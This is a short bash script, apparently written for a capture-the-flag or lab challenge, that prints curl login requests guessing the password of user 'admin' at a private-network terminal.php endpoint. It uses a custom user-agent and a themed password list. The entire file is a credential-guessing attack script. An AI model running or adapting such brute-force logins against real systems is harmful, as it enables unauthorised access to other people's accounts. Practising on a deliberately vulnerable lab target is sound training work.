#!/usr/bin/env bash

USERNAME="admin"
UA="secretcomputer"

PASSWORDS=(
  "admin"
  "password"
  "admin123"
  "secret"
  "secretcomputer"
  "wormhole"
  "wormhole1"
  "bunny"
  "rabbit"
  "easter"
  "easterbunny"
  "operator"
  "terminal"
  "console"
  "control"
  "controlpanel"
)

echo "[*] Top password attempts for user: $USERNAME"
echo "[*] Run each command and watch for a response that is NOT:"
echo '    {"status":"fail","msg":"Invalid credentials."}'
echo

for PASS in "${PASSWORDS[@]}"; do
  echo "curl -i -A \"$UA\" \\"
  echo "  -d \"username=$USERNAME&password=$PASS\" \\"
  echo "  \"http://10.67.147.80/terminal.php?action=login\""
  echo
done

